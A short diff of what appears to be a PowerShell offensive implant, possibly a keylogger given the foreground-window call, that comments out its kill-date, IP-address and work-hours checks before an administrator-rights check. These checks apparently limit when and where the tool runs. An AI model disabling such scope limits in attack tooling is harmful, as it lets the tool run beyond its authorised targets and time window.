@@ -866,11 +866,11 @@ public static extern IntPtr GetForegroundWindow();
             Write-Verbose "Running RandomWait"
             RandomWait
             Write-Verbose "Running CheckKillDate"
-            CheckKillDate
+            #CheckKillDate
             Write-Verbose "Running CheckIPAddress"
-            CheckIPAddress
+            #CheckIPAddress
             Write-Verbose "Runing CheckWorkHours"
-            CheckWorkHours
+            #CheckWorkHours
             
             #Check to see if we are running with admin rights
             $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
